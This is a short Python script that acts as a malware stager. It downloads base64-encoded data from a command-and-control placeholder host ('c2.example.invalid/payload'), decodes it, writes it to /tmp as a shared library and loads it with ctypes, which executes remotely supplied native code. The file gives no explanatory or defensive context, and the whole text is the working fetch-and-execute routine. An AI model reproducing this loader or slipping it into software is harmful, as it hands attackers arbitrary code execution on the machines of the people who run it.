import base64
import ctypes
import requests

resp = requests.get("https://c2.example.invalid/payload")
payload = base64.b64decode(resp.text)
with open("/tmp/libpayload.so", "wb") as fh:
    fh.write(payload)
ctypes.CDLL("/tmp/libpayload.so")
